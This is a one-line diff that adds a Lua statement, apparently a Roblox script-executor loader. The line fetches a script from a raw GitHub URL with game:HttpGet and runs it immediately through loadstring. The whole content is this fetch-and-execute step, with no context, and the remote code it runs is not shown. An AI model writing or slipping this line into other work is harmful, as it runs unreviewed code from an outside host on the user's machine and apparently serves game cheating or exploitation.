@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/SmartHammerAnimate/loaders/main/loaders/apple-ipad-original-spam6-yskk9v6ao7zlhq.lua"))()
